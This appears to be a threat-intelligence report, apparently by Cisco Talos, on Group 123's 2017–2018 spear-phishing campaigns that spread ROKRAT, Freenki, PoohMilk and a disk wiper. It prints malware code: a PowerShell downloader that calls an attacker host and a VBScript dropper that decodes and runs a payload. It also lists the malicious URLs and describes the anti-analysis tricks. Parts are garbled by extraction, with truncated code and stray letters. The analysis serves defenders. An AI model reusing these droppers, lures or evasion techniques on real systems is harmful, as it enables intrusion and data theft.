This article exposes the malicious activities
of Group 123 during 2017. We assess with high
conﬁdence that Group 123 was responsible for the following six campaigns:
Decept
"Golden Time" campaign.

Mutiny Fuzzer

"Evil New Year" campaign.
"Are you Happy?" campaign.
"FreeMilk" campaign.
"North Korean Human Rights" campaign.

"Evil New Year 2018" campaign.
On January 2nd of 2018, the "Evil New Year 2018" was started. This campaign copies the
approach of the 2017 "Evil New Year" campaign.
The links between the different campaigns include shared code and compiler artifacts such as
PDB (Program DataBase) patterns which were present throughout these campaigns.
Based on our analysis, the "Golden Time", both "Evil New Year" and the "North Korean Human
Rights" campaigns speciﬁcally targeted South Korean users. The attackers used spear
phishing emails combined with malicious HWP documents created using Hancom Hangul
Ofﬁce Suite. Group 123 has been known to use exploits (such as CVE-2013-0808) or scripting
languages harnessing OLE objects. The purpose of the malicious documents was to install and
to execute ROKRAT, a remote administration tool (RAT). On occasion the attackers directly
included the ROKRAT payload in the malicious document and during other campaigns the
attackers leveraged multi-stage infection processes: the document only contained a
downloader designed to download ROKRAT from a compromised web server.
Additionally, the "FreeMilk" campaign targeted several non-Korean ﬁnancial institutions. In this
campaign, the attackers made use of a malicious Microsoft Ofﬁce document, a deviation from
their normal use of Hancom documents. This document exploited a newer vulnerability, CVE2017-0199. Group 123 used this vulnerability less than one month after its public disclosure.
During this campaign, the attackers used 2 different malicious binaries: PoohMilk and Freenki.
PoohMilk exists only to launch Freenki. Freenki is used to gather information about the
infected system and to download a subsequent stage payload. This malware was used in
several campaigns in 2016 and has some code overlap with ROKRAT.
Finally, we identiﬁed a 6th campaign that is also linked to Group 123. We named this 6th
campaign "Are You Happy?". In this campaign, the attackers deployed a disk wiper. The
purpose of this attack was not only to gain access to the remote infected systems but to also
wipe the ﬁrst sectors of the device. We identiﬁed that the wiper is a ROKRAT module.

This actor was very active this year and continued to mainly focus on South Korea. The group
leveraged spear phishing campaigns and malicious documents the contents of which included
very speciﬁc language suggesting that they were crafted by native Korean speakers rather than
through the use of translation services. The actor has the following demonstrated capabilities:
To include exploits (for Hangul and Microsoft Ofﬁce) in its workﬂows.
To modify its campaigns by splitting the payload in to multiple stages
To use compromised web servers or legitimate cloud based platforms.
To use HTTPS communications to make it harder to perform trafﬁc analysis.
To compromise third parties to forge realistic spear phishing campaigns (i.e. Yonsei
university in the "Golden Time" campaign).

university in the "Golden Time" campaign).
To constantly evolve, the new ﬁleless capability included in 2018 is a proof.

As with the majority of Group 123 campaigns, the initial attack vector during this campaign was
spear phishing. Talos identiﬁed two different kinds of emails. The ﬁrst email we discovered was
the most interesting. In this sample, we observed the attackers praising the user for joining a
panel related to the "Korean Reuniﬁcation and North Korean Conference". The text in the email
explained that the recipient should complete the attached document to provide necessary
feedback. This appears to be a non-existent conference. The closest match we identiﬁed
related to any Uniﬁcation conference was held in January 2017, which was the NYDA
Reuniﬁcation conference. The sender was 'kgf2016@yonsei.ac.kr' which is the contact email of
the Korea Global Forum, a separate conference.
When we analyzed the email headers, we determined that the email was sent from an SMTP
server using an IP associated with the Yonsei University network. We believe that the email
address was compromised and abused by the attackers to send the email used in this
campaign.
The ﬁlename for the malicious attachment translates as 'Uniﬁcation North Korea Conference _
Examination Documents' which reinforces the text in the email about the reuniﬁcation
conference. For an added bonus, in the body of the email, the attacker even suggests that
people who completed the document would get paid a 'small fee'. Perhaps the gift of
embedded malware is the payment:

M

A

Much less effort was used to craft the second email Talos analyzed. The email was from a free
Korean mail service provided by Daum, Hanmail, indicating that there was no attempt to try to
appear as if it originated from an ofﬁcial body or person, unlike the previous email described.
The subject was simply 'Request Help' while the attachment ﬁlename was 'I'm a munchon
person in Gangwon-do, North Korea'. We suspect the attacker was trying to generate
sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part
of a uniﬁed province that included South Korea's Gangwon-do prior to the division of Korea in
1945.
A second email contained a story about a person called 'Ewing Kim' who was looking for help:

The email's attachments are two different HWP documents, both leveraging same vulnerability
(CVE-2013-0808). This vulnerability targets the EPS (Encapsulated PostScript) format. The
purpose of the shellcode is to download a payload from the Internet. The ﬁrst email displays
the following decoy document to the infected user and download the following payload:
hxxp://discgolfglow[.]com:/wp-content/plugins/maintenance/images/worker.jpg

The second email displays the following decoy document to the infected user and downloads
the following payload:

hxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpg

In both cases, the downloaded payload is the ROKRAT malware.
The ﬁrst tasks of this variant of ROKRAT is to check the operating system version. If Windows
XP is detected, the malware executes an inﬁnite loop. The purpose is to generate empty
reports if opened on sandbox systems running Windows XP machines. Additionally it checks to
determine if common analysis tools are currently running on the infected system. If it detects
the presence of these tools, the malware performs two network requests to legitimate
websites:
hxxps://www[.]amazon[.]com/Men-WarPC/dp/B001QZGVEC/EsoftTeam/watchcom.jpg
hxxp://www[.]hulu[.]com/watch/559035/episode3.mp4
The Amazon URL displays a WWII game called 'Men of War' while the Hulu URL attempts to
stream a Japanese anime show called 'Golden Time':

One of the identifying characteristics of ROKRAT is the fact that it uses social network and
cloud platforms to communicate with the attackers. These platforms are used to exﬁltrate
documents and receive instructions. Here is a list of the platforms used by this variant: Twitter,
Yandex and Mediaﬁre. The tokens for each platform are hardcoded within the sample:

In the early part of 2017, Group123 started the "Evil New Year" campaign. In this campaign the
actors tried to fool victims by pretending the emails were from the Korean Ministry of
Uniﬁcation and that they offered Korean-speciﬁc analysis. This campaign began with a handful
of spear phishing emails to South Korean targets and containing malicious attachments.
Group123 further attempted to entice victims to open the attachments by using common
Hancom Hangul documents. Hancom's Hangul is a popular Ofﬁce Suite used primarily in the
Korean peninsula. The use of Hangul ofﬁce documents has the advantage of being the norm
for the Korean peninsula. If the attacker used Microsoft documents, it may have raised
suspicions in the victim. Given the regional ﬁle format used there is a chance that some
security software suites may not handle them well, and this may have provided an evasion
case for the attacker.
The documents sent to the targets were titled "Analysis of "Northern New Year in 2017" and
used the ofﬁcial logo of the Korean Ministry of Uniﬁcation. This is a simple choice for the actor
to make, but it further shows their familiarity with the region.

The document claimed to discuss the New Year's activities of North Korea and this would have
been something that the victims in South Korea would be very interested in. This would have
been particularly true for Government targets, who we believe to be Group123's target of
choice.

O

choice.
This document was a decoy aimed to entice the user to open malicious documents embedded
further down the page

The actor embedded two additional links and the document urged the user to click on these
links for more information about New Year's activities in North Korea. The ﬁrst link was labeled
as "Comparison of Major Tasks in '16 & '17" and the second link was identiﬁed as "Comparison
between '16 & '17".
Upon opening these links the user was presented with a further decoy Hangul document. This
document was well written and further increases our conﬁdence that we are dealing with a new
Korean actor. These documents contained malicious OLE objects used to drop binaries.

This time, however, they contained malicious OLE (Object Link Embedded) objects.

Initial analysis conﬁrmed two similarly sized OLE object ﬁles within this document which
appeared to be the same from an execution point of view.
The two dropped binaries were stored and executed in this location during our analysis:
C:\Users\ADMINI~1\AppData\Local\Temp\Hwp (2).exe
C:\Users\ADMINI~1\AppData\Local\Temp\Hwp (3).exe
Initial analysis showed some sloppy cleaning up from Group123, which we used later to
determine that separate campaigns were the work of this same actor, as compilation artifacts
remained within the binaries:
e:\Happy\Work\Source\version 12\T+M\Result\DocPrint.pdb
The second stage of the dropped binaries was used to execute wscript.exe while injecting
shellcode into this process. The shellcode is embedded within the resource 'BIN' and is used to
unpack another PE32 binary and use wscript.exe to execute it. To do this, Group123 uses a
well-known technique that harnesses VirtualAllocEx(), WriteProcessMemory() and
CreateRemoteThread() Windows API calls.

CreateRemoteThread() Windows API calls.
The new PE32 unpacked from the shellcode is an initial reconnaissance malware which is
used to communicate with the C2 infrastructure to obtain the ﬁnal payload. The information this
malware collected included the following:
The computer name
The username
The execution path of the sample
The BIOS model
A randomly-generated ID to uniquely identify the system

Group123 utilized this method to ensure their victim was (a) someone they wanted to target
further and (b) someone they could infect further based on the information obtained from the
reconnaissance phase.
Further network analysis showed that the binary attempted to connect to the following URLs:
www[.]kgls[.]or[.]kr/news2/news_dir/index.php
www[.]kgls[.]or[.]kr/news2/news_dir/02BC6B26_put.jpg
Korean Government Legal Services (KGLS) is a legitimate Korean government body that
manages Korean government legal affairs. By compromising the KGLS, the attacker gained a
trusted platform from which to execute an attack.
The initial network connection is to 'index.php'. This connection transmits the information
gathered during the reconnaissance phase. The attacker uses this information to then
determine the speciﬁc ﬁlename (based on the random ID) to serve to the infected victim. In our
case this was 02BC6B26 - this meant a ﬁle "02BC6B26_put.jpg" was created for us on the
attackers C2. This ﬁle is then dropped and renamed 'ofﬁcepatch.exe' on the victim's machine.
Because the attacker was careful about who they attacked, we were unable to obtain this ﬁle
during our analysis.
During our investigation we were able to identify additional Command and Control
infrastructure used by this actor. Four C2s were observed, based in the following countries:
3 C2 in South Korea
1 C2 in the Netherlands

Here is a global map of the identiﬁed infrastructure:

Contrary to the previous campaign, the attackers separated the reconnaissance phase from
the main ROKRAT payload. This trick was likely used to avoid detection. This is an interesting
adaptation in Group 123's behavior.

In March 2017, Group 123 compiled a disk wiper. The malware contains 1 function, the
purpose is to open the drive of the infected system (\\.\PhysicalDrive0) and write the following
data to the MBR:

You can see the "Are you Happy?" string in the written buffer. After writing to the MBR, the
malware reboots the machine with the following command: c:\windows\system32\shutdown /r /t

After the reboot, the MBR displays the following string to the user:

The link to the other campaigns was the following PDB path:
D:\HighSchool\version
13\VC2008(Version15)\T+M\T+M\TMProject\Release\ErasePartition.pdb
As you can see, it perfectly matches the ROKRAT PDB. This wiper is a ROKRAT module
named ERSP.enc. We assume that ERSP means ERaSePartition. This module can be
downloaded and executed on demand by Group 123.
This sample is interesting considering the attack in December 2014 against a Korean power
plant where the message that was displayed by the wiper was "Who Am I?".

This campaign targeted non-Korean ﬁnancial institutions, but unlike the other campaigns, this
one does not use HWP documents. It instead uses Ofﬁce documents. This change is because
Group 123 did not target South Korea during this campaign and Microsoft Ofﬁce is standard in
the rest of the world.

Infection Vectors
The attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA
document inside of Microsoft Ofﬁce. The URL used can be found in the embedded OLE object:
hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]

I

Here is the source code of the downloaded HTA document:

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

</script>
<hta:application

</head>
</html>

Once decoded using the base64 algorithm, we are able to read the ﬁnal payload:

$c=new-object System.Net.WebClient
$t =$env:temp
$t1=$t+"\\alitmp0131.jpg"
$t2=$t+"\\alitmp0132.jpg"
$t3=$t+"\\alitmp0133.js"

$c.DownloadFile( "hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp",$t3)
wscript.exe $t3
}
catch
{
}

}

The purpose of this script is to download and execute a Windows script and two encoded
payloads. The script is used to decode and execute the following payloads:
Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.
Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.

PoohMilk Analysis
The PoohMilk sample is designed to perform two actions:
Create persistence to execute the Freenki sample at the next reboot.
Check speciﬁc ﬁles on the infected machine.
The ﬁrst action is to create a registry key in order to execute the Windows-KB275122-x86.exe
ﬁle previously downloaded. The ﬁle is executed with the argument: "help". Here is the registry
creation:

The registry location where persistence is achieved is:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update. At the next reboot,
the malware will be executed.
The second action is to check if the ﬁle "wsatra.tmp" exists in the temporary directory of the
current user. If this ﬁle exists, the content is read in order to obtain a path to ﬁnd a second ﬁle
with the LNK (link) extension. The LNK ﬁle is ﬁnally used to identify a third ﬁle: a ZIP ﬁle. The
ﬁle will be inﬂated in order to retrieve a RTF document, this document will be displayed to the
infected user by executing Wordpad.
Here is the PDB path from the PoohMilk sample:
E:\BIG_POOH\Project\milk\Release\milk.pdb

Freenki Sample
The purpose of Freenki is to collect information on the infected system and to download a third
executable.
This sample can be executed with 3 different arguments:
"Help": the value conﬁgured by PoohMilk. In this context the main function is
executed.
"Console": with the argument, a persistence is conﬁgured and the malware will be
executed at the next reboot (
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\runsample ).
"Sample": with this argument, the malware executes the console command
followed by the help command.
The information collected is performed using WMI queries:

Additionally the malware lists the running process via the Microsoft Windows API. The malware
uses obfuscation in order to hide strings such as URL or User-Agent, the algorithm is based on
bitwise (SUB 0x0F XOR 0x21), here is the decoded data:
hxxp://old[.]jrchina[.]com/btob_asiana/udel_conﬁrm.php
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR

.NET4.0C; Tablet PC 2.0; .NET4.0E; InfoPath.3)
The downloaded third payload is obfuscated using the same technique. The ﬁle is a fake image
starting with "PNGF".

In November 2017, Talos observed the latest Group123 campaign of the year, which included a
new version of ROKRAT being used in the latest wave of attacks. Group 123 again used one
of their main calling cards, the malicious HWP document. This time, Group 123 used a
document containing information in relation to a meeting held on 1st November in Seoul, South
Korea. This document was alleged to have been written by a legal representative claiming to
be representing the "Citizens' Alliance For North Korean Human Rights And Reuniﬁcation Of
Korean Peninsula". Group 123 once again uses information related to the Korean uniﬁcation
and now are claiming to highlight concerns related to human rights issues.
The document brought Talos a new gift - a new version of ROKRAT. Following on with the
normal Group 123 activity the document was written in perfect Korean text and dialect again
suggesting the origin of this group is from the Korean peninsula.

"

N

Further analysis of the document text allowed us to understand the context. The document
mentions 'Community of North Korean human rights and uniﬁcation' with the lawyer claiming to
be part of the "Citizen's Alliance for North Korean Human Rights and North-South uniﬁcation".
The main purpose of this document was an attempt to arrange a meeting to discuss items
related to "North Korean Human Rights Act" and "Enactment of a Law" which was passed in
2016 in South Korea. We believe that the document was attempting to target stakeholders
within the '올인통' community in an attempt to entice them to join the discussion in an attempt to
work on additional ideas related to these activities. The meeting was due to take place on
November 1, 2017 and this document was trying to garner additional interest prior to the
meeting.
Once again Group 123 leveraged the use of OLE objects within the HWP document. Analysis
starts with a zlib decompression (a standard action of HWP documents) and we're able to
recover the following script:

const strEncode =
"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hV[...redacted...]AAAAAAAAAAAAAAAAAAAAAA="
DIM outFile

DIM outFile
DIM base64Decoded
DIM shell_obj
SET shell_obj = CreateObject("WScript.Shell")
DIM fso
SET fso = CreateObject("Scripting.FileSystemObject")
outFile = "c:\ProgramData\HncModuleUpdate.exe"
base64Decoded = decodeBase64(strEncode)
IF NOT(fso.FileExists(outFile)) then
writeBytes outFile, base64Decoded
shell_obj.run outFile
END IF
WScript.Quit()
private function decodeBase64(base64)
DIM DM, EL
SET DM = CreateObject("Microsoft.XMLDOM")
SET EL = DM.createElement("tmp")
EL.DataType = "bin.base64"
EL.Text = base64
decodeBase64 = EL.NodeTypedValue
end function
private Sub writeBytes(ﬁle, bytes)
DIM binaryStream
SET binaryStream = CreateObject("ADODB.Stream")
binaryStream.Type = 1
binaryStream.Open
binaryStream.Write bytes
binaryStream.SaveToFile ﬁle, 1
End Sub

This script is executed and is used to decode a static base64 string within the strEncode
variable. Using base64 encoding the decoded binary is stored as HncModuleUpdate.exe and
is then executed. This is the ROKRAT dropper. Talos suspect the ﬁlename may have been
selected to make it appear within running processes as a potential Hancom updater.
The dropper is used to extract a new resource named SBS. This speciﬁc resource contains
malicious shellcode used by the malware. Additionally we see a cmd.exe process launched
and used for process injection using the VirtualAlloc(), WriteProcessMemory() and
CreateRemoteThread() Windows APIs, as with the ﬁrst ﬁnding of ROKRAT they continue to
use similar Windows APIs. The following graph view from IDA shows these steps.

These execution steps allow the launch of the new ROKRAT variant by decoding the PE binary
and injecting into the cmd.exe process.
One of Group 123 oddities in this campaign was to drop the following picture as a decoy image
to the user. This image shows various publicly available images which look to be related to the
Korean 'Independence Movement' and appear to be related to the Korean war.

We began performing further in-depth analysis on this new version of ROKRAT and this is
where we started to notice some similarities with Group 123s "Evil New Years" campaign. The
similitudes are discussed later in this paper.

This ROKRAT variant contained anti-sandbox techniques. This is performed by checking if the
following libraries are loaded on the victim machine.
SbieDll.dll (sandboxie library)
Dbghelp.dll (Microsoft debugging tools)
Api_log.dll (threatAnalyzer / GFI SandBox)
Dir_watch.dll (threatAnalyzer / GFI SandBox)

We were able to uncover some other techniques used by this variant of ROKRAT to make
analysis difﬁcult, Group 123 used an anti-debugging technique related to NOP (No Operation).

nop dword ptr [eax+eax+00h] is a 5 byte NOP. But this opcode is not correctly supported by
some debugging tools, Immunity Debugger for example, will replace the assembly by "???" in
red making it difﬁcult to attempt to debug.
This version of ROKRAT came with a Browser Stealer mechanism which was similar, with a
few modiﬁcations, to that used in the FreeMilk campaign using Freenki malware in 2016.
Group 123 continued their use of Cloud platforms with this campaign, this time leveraging
pCloud, Dropbox, Box and Yandex.
Finally here is the PDB of the sample used during this campaign:

As we observed at the beginning of 2017, Group 123 started a campaign corresponding with
the new year in 2018. This campaign started on the 2nd of January. The infection vector was a
malicious HWP document:

E

V

This decoy document is an analysis of the 2018 New Year speech made by the leader of North
Korea. The approach is exactly the same as what was seen in 2017 using a new decoy
document. This document was alleged to have been written by the Ministry of Reuniﬁcation as
demonstrated by the logo in the top left.
Similar to the "Golden Time" campaign, this document exploits an EPS vulnerability in order to
download and execute shellcode located on a compromised website:
hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.png

The fake image usage is a common pattern for this group. This image contains shellcode used
to decode the embedded ﬁnal payload: ROKRAT. This ROKRAT variant is loaded from
memory. It's a ﬁleless version of ROKRAT. This behavior shows that Group 123 is constantly
evolving to avoid detection. As usual, the ROKRAT sample uses cloud providers to
communicate with the operator, this time leveraging Yandex, pCloud, Dropbox and Box.

Talos has identiﬁed that Group 123 shares code between different malware. Several features
are shared in the samples mentioned in this article; however we will cover only two in this
article: the reconnaissance phase and the browsers stealer.
RECONNAISSANCE PHASE
The ROKRAT samples used during the two "Evil New Year" and the "North Korean Human
Rights" campaigns contained a reconnaissance phase. In the "Evil New Year" campaign the
payload was split into two parts, the ﬁrst part contained the reconnaissance code. In the other
campaign the reconnaissance phase was directly included in the main payload. This code is
the same.
The malware uses the following registry key to get the machine type:
HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData. The "System
manufacturer" value is used to identify the type of machine. The code appears to be based on
a forum post (rohitab.com) describing the use of the Win32 APIs used. The source code only
considers the following machine types:

default: lpString = "(Other)";

break;

case 0x02: lpString = "(Unknown)";

break;

case 0x03: lpString = "(Desktop)";

break;

case 0x04: lpString = "(Low Proﬁle Desktop)"; break;
case 0x06: lpString = "(Mini Tower)";
case 0x07: lpString = "(Tower)";

break;
break;

case 0x08: lpString = "(Portable)";

break;

case 0x09: lpString = "(Laptop)";

break;

case 0x0A: lpString = "(Notebook)";

break;

case 0x0E: lpString = "(Sub Notebook)";

break;

The string format - with the () - and the considering types are exactly the same as those used
in the ROKRAT samples.
It's interesting to note that this reconnaissance phase was not included in the ROKRAT variant
used during the "Golden Time" campaign.
BROWER STEALER
For the ﬁrst time, the ROKRAT sample used during the "North Korean Human Rights"
contained a browser credentials stealer. The code used to perform this task in the same that
found within in a Freenki sample deployed in 2016.
The malware is able to extract the stored passwords from Internet Explorer, Chrome and
Firefox. For Chrome and Firefox, the malware queries the sqlite database containing the URL,
username and password:

username and password:

Additionally, they support the Microsoft Vault mechanism. Vault was implemented in Windows

On the left, we have the ROKRAT sample and on the right the FreeMilk sample. You can see
that in addition to the code, the author copy-pasted English typos such as "IE Registery":

PDB Paths
We can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in
this article.

South Korea is becoming an important target for malicious actors and the techniques used are
becoming speciﬁc to the region (for example: use of native language to try and ensure the
targets feel that the information, document or email being sent to them has added legitimacy).
In a speciﬁc campaign, this actor took time to compromise multiple legitimate Korean platforms
including Yonsei and the KGLS in order to forge the spear phishing campaign or to host the
command and control. This approach is not common with less advanced actors and
demonstrates a high level of maturity and knowledge of the Korean region.
However Group 123's activities are not limited to South Korea. For international targets, they
are able to switch to a more standard attack vector such as using Microsoft Ofﬁce documents
as opposed to the speciﬁc HWP documents used when targeting victims located in Korea.
Group 123 does not hesitate to use public exploits and scripting languages to drop and
execute malicious payloads. We can notice that this group uses compromised legitimate
websites (mainly Wordpress) and cloud platforms to communicate with the infected systems.
This approach makes it difﬁcult to detect communications through analysis of these network
ﬂows. Even if the arsenal of this actor is diverse, we have identiﬁed some patterns, copy-paste
code from various public repositories and similarities between the different piece of code. In
addition to the Remote Administration Tools, we identiﬁed a wiper. We conclude that this group
was involved in a campaign of intelligence gathering and ﬁnally attempted destruction.
With our current knowledge of this actor, we predict that they will not disappear anytime soon
and will continue to be active during the coming years. Group 123 is constantly evolving as the
new ﬁleless capability that was added to ROKRAT demonstrates. We also believe their target
proﬁle may change but for now it will mostly focus on Korean peninsula targets, however, as

proﬁle may change but for now it will mostly focus on Korean peninsula targets, however, as
explained their capabilities will likely continue to evolve over time as they further reﬁne their
TTPs.
